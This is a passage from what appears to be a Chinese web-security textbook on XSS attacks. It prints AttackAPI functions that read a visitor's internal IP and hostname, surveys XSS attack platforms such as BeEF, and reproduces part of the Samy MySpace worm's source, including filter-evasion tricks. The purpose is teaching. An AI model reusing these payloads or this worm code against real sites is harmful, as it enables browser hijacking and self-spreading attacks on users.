*/
AttackAPI.dom.getInternalIP = function () {
try {
var sock = new
java.net.Socket();
sock.bind(new
java.net.InetSocketAddress('0.0.0.0', 0));
sock.connect(new
java.net.InetSocketAddress(document.domain,
(!document.location.port)?
80:document.location.port));
return
sock.getLocalAddress().getHostAddress();
} catch (e) {}
return '127.0.0.1';
};
此外，还有两个利用Java获取本地网络信息的API：
/**
* @cat DOM
* @name AttackAPI.dom.getInternalHostname
* @desc get internal hostname
* @return {String} hostname
*/
AttackAPI.dom.getInternalHostname = function
() {
try {
var sock = new
java.net.Socket();
sock.bind(new
java.net.InetSocketAddress('0.0.0.0', 0));
sock.connect(new
java.net.InetSocketAddress(document.domain,
(!document.location.port)?
80:document.location.port));
return
sock.getLocalAddress().getHostName();
} catch (e) {}
return 'localhost';
};
/**
* @cat DOM
* @name AttackAPI.dom.getInternalNetworkInfo
* @desc get the internal network information
* @return {Object} network information
object
*/
AttackAPI.dom.getInternalNetworkInfo =
function () {
var info = {hostname: 'localhost',
IP: '127.0.0.1'};
try {
var sock = new
java.net.Socket();
sock.bind(new
java.net.InetSocketAddress('0.0.0.0', 0));
sock.connect(new
java.net.InetSocketAddress(document.domain,
(!document.location.port)?
80:document.location.port));
info.IP =
sock.getLocalAddress().getHostAddress();
info.hostname =
sock.getLocalAddress().getHostName();
} catch (e) {}
return info;
};
这种方法需要攻击者写一个Java Class，嵌入到当前页面中。除了Java之外，一些
ActiveX控件可能也会提供接口查询本地IP地址。这些功能比较特殊，需要根据具体情
况具体分析，这里不赘述了。
Metasploit引擎曾展示过一个强大的测试页面，综合了Java Applet、Flash、
iTunes、OfficeWord、QuickTime等第三方软件的功能，抓取用户的本地信息，有兴趣
深入研究的读者可以参考。
3.2.3 XSS 攻击平台
XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为
XSS攻击平台。这些攻击平台的主要目的是为了演示XSS的危害，以及方便渗透测试使
用。下面就介绍几个常见的XSS攻击平台。
Attack API
Attack API是安全研究者pdp所主导的一个项目，它总结了很多能够直接使用XSS
Payload，归纳为API的方式。比如上节提到的“获取客户端本地信息的API”就出自这个
项目。
BeEF
BeEF曾经是最好的XSS演示平台。不同于Attack API，BeEF所演示的是一个完整
的XSS攻击过程。BeEF有一个控制后台，攻击者可以在后台控制前端的一切。
BeFF的后台界面
每个被XSS攻击的用户都将出现在后台，后台控制者可以控制这些浏览器的行为，
并可以通过XSS向这些用户发送命令。
XSS-Proxy
XSS-Proxy是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程
控制被XSS攻击的浏览器。
XSS-Proxy的实现原理
这些XSS攻击平台有助于深入理解XSS的原理和危害。
3.2.4 终极武器：XSS Worm
XSS也能形成蠕虫吗？我们知道，以往的蠕虫是利用服务器端软件漏洞进行传播
的。比如2003年的冲击波蠕虫，利用的是Windows的RPC远程溢出漏洞。
3.2.4.1 Samy Worm
在2005年，年仅19岁的Samy Kamkar发起了对MySpace.com的XSS Worm攻击。
SamyKamkar的蠕虫在短短几小时内就感染了100万用户——它在每个用户的自我简介
后边加了一句话：“but most of all, Samy is my hero.”（Samy是我的偶像）。这是Web
安全史上第一个重量级的XSSWorm，具有里程碑意义。
今天我们看看当时的Samy蠕虫都做了些什么？
首先，MySpace过滤了很多危险的HTML标签，只保留了标签、标签、
标签等“安全的标签”。所有的事件比如“onclick”等也被过滤了。但是MySpace却允
许用户控制标签的style属性，通过style，还是有办法构造出XSS的。比如：
其次，MySpace同时还过滤了“javascript”、“onreadystatechange”等敏感词，所以
Samy用了“拆分法”绕过这些限制。
最后，Samy通过AJAX构造的POST请求，完成了在用户的heros列表里添加自己名
字的功能；同时复制蠕虫自身进行传播。至此，XSS Worm就完成了。有兴趣的读者可
以参考Samy蠕虫的技术细节分析。
下面附上Samy Worm的源代码。这是具有里程碑意义的第一个XSS Worm，原本
的代码压缩在一行内。为了方便阅读，如下代码已经经过了整理和美化。
0){
N+='&'
}
var Q=escape(AV[P]);
while(Q.indexOf('+')!=-1){
Q=Q.replace('+','%2B')
}
while(Q.indexOf('&')!=-1){
Q=Q.replace('&','%26')
}
N+=P+'='+Q;
O++
}
return N
}
function httpSend(BH,BI,BJ,BK){
if(!J){
return false
}
eval('J.onr'+'eadystatechange=BI');
J.open(BJ,BH,true);
if(BJ=='POST'){
J.setRequestHeader('Content-
Type','application/x-www-form-urlencoded');
J.setRequestHeader('Content-
Length',BK.length)
}
J.send(BK);
return true
}
function findIn(BF,BB,BC){
var R=BF.indexOf(BB)+BB.length;
var S=BF.substring(R,R+1024);
return S.substring(0,S.indexOf(BC))
}
function getHiddenParameter(BF,BG){
return findIn(BF,'name='+B+BG+B+'
value='+B,B)
}
function getFromURL(BF,BG){
var T;
if(BG=='Mytoken'){
T=B
}else{
T='&'
}
var U=BG+'=';
var V=BF.indexOf(U)+U.length;
var W=BF.substring(V,V+1024);
var X=W.indexOf(T);
var Y=W.substring(0,X);
return Y
}
function getXMLObj(){
var Z=false;
if(window.XMLHttpRequest){
try{
Z=new XMLHttpRequest()
}catch(e){
Z=false
}
}else if(window.ActiveXObject){
try{
Z=new
ActiveXObject('Msxml2.XMLHTTP')
}catch(e){
try{
Z=new
ActiveXObject('Microsoft.XMLHTTP')
}catch(e){
Z=false